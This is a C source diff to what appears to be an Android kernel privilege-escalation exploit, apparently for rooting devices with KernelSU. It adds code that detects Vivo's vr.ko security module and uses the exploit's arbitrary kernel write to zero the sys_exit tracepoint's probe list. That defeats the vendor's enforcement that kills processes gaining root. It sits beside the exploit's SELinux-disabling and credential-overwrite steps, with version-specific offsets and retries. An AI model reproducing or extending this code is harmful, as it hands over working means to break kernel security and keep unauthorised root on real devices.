@@ -911,6 +911,83 @@ static pid_t spawn_child(struct child_pipes *p) {
   return child;
 }
 
+/*
+ * neutralize_vr_global() — disable vr.ko's sys_exit enforcement probe.
+ *
+ * Vivo devices ship vr.ko which registers an enforcement kprobe (func1)
+ * on __tracepoint_sys_exit. When any process commits uid=0 credentials,
+ * vr's commit_creds probe (func2) sets per-task tags. func1 then kills
+ * the tagged process on the next sys_exit. This makes ksud and all shells
+ * it spawns die immediately after getting root.
+ *
+ * The VR_TAG_A_OFF block below only strips tags from the exploit child, so
+ * it covers the child through W2 verify and nothing else. Zeroing
+ * __tracepoint_sys_exit.funcs disables the probe for every process.
+ *
+ * The standard kernel tracepoint iterator checks for NULL funcs before
+ * calling probes — safe to zero, no kernel panic. The commit_creds probe
+ * (func2) still runs and sets tags, but func1 never fires to act on them.
+ *
+ * Gated on:
+ *   - vr.ko detected in /proc/modules (vr_loaded)
+ *   - active_offsets->off_vr_sys_exit_tp != 0 (non-vivo kernels untouched)
+ *
+ * NOTE: funcs is NOT at a fixed offset across KMIs — see target.h. On 6.6
+ * the struct gained `probestub` and funcs moved 0x40 -> 0x48.
+ *
+ * Called once after W1 (SELinux permissive), before spawn_victim.
+ * 5 retries because do_one_write is probabilistic.
+ */
+
+/* offsetof(struct tracepoint, funcs) for the running KMI. */
+static uint32_t tracepoint_funcs_off(void) {
+  const char *r = active_offsets ? active_offsets->uname_r : NULL;
+  unsigned maj = 0, min = 0;
+  if (!r || sscanf(r, "%u.%u", &maj, &min) != 2) {
+    pr_warning("vr global: cannot parse KMI '%s'; assuming 6.1 layout\n",
+               r ? r : "(null)");
+    return TRACEPOINT_FUNCS_OFF_6_1;
+  }
+  /* Boundary verified on 6.1 (0x48/0x40) and 6.6 (0x50/0x48) only; other
+   * KMIs are assumed to follow the same rule. Re-check with
+   * `__traceiter_sys_exit` if a new KMI misbehaves. */
+  if (maj > 6 || (maj == 6 && min >= 6)) return TRACEPOINT_FUNCS_OFF_6_6;
+  return TRACEPOINT_FUNCS_OFF_6_1;
+}
+
+static int neutralize_vr_global(void) {
+  if (!active_offsets || !active_offsets->off_vr_sys_exit_tp) {
+    /* The caller only gets here when vr.ko is actually loaded, so this is
+     * a real gap, not a non-vivo device: say so loudly instead of the old
+     * silent skip, which hid the whole failure on 6.6. */
+    pr_warning("vr global: vr.ko is loaded but off_vr_sys_exit_tp is unset "
+               "(kernel %s not in the offset table and no offsets.json "
+               "override); KSU shells will be killed\n",
+               active_offsets ? active_offsets->uname_r : "(no offsets)");
+    return 0;
+  }
+  uint32_t funcs_off = tracepoint_funcs_off();
+  uintptr_t tp_funcs_addr =
+      data_addr(KIMAGE_TEXT_BASE + active_offsets->off_vr_sys_exit_tp)
+      + funcs_off;
+  pr_info("vr global: tp=%016zx funcs_off=0x%x -> zeroing @ %016zx\n",
+          (size_t)data_addr(KIMAGE_TEXT_BASE +
+                            active_offsets->off_vr_sys_exit_tp),
+          funcs_off, tp_funcs_addr);
+  for (int attempt = 1; attempt <= 5; attempt++) {
+    int ok = do_one_write(tp_funcs_addr,
+                          "VR-global: sys_exit tp->funcs", 1, 1);
+    if (ok) {
+      pr_success("vr.ko sys_exit probe killed (attempt %d)\n", attempt);
+      return 1;
+    }
+    pr_warning("vr global: attempt %d failed, retrying\n", attempt);
+    usleep(50000);
+  }
+  pr_warning("vr global: all 5 attempts failed; KSU shells may be killed\n");
+  return 0;
+}
+
 /* Fork the victim and read back the task pointer perf leaked. */
 static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
   pid_t child = spawn_child(p);
@@ -1069,6 +1146,32 @@ int run_exploit(int argc, char **argv) {
     TIMER("Write 1 complete");
   } else {
     pr_success("SELinux already permissive\n");
+  }
+
+  /* Vivo vr.ko: globally disable the sys_exit enforcement probe now that
+   * SELinux is permissive. Must happen before spawn_victim so ksud and
+   * any shells it spawns are not killed after W2 grants root. Only runs
+   * when off_vr_sys_exit_tp is set (vivo-specific kernel offsets). */
+  {
+    int vr_loaded = 0;
+    FILE *mf = fopen("/proc/modules", "r");
+    if (!mf) {
+      /* /proc/modules unreadable under some SELinux configs; if the
+       * per-kernel offsets have off_vr_sys_exit_tp set, assume loaded. */
+      if (active_offsets && active_offsets->off_vr_sys_exit_tp)
+        vr_loaded = 1;
+    } else {
+      char mod[256];
+      while (fgets(mod, sizeof(mod), mf)) {
+        if (!strncasecmp(mod, "vr", 2) && (mod[2] == ' ' || mod[2] == '_')) {
+          vr_loaded = 1;
+          break;
+        }
+      }
+      fclose(mf);
+    }
+    if (vr_loaded)
+      neutralize_vr_global();
   }
 
   /* W2: overwrite the child credential via the task leaked by perf. */
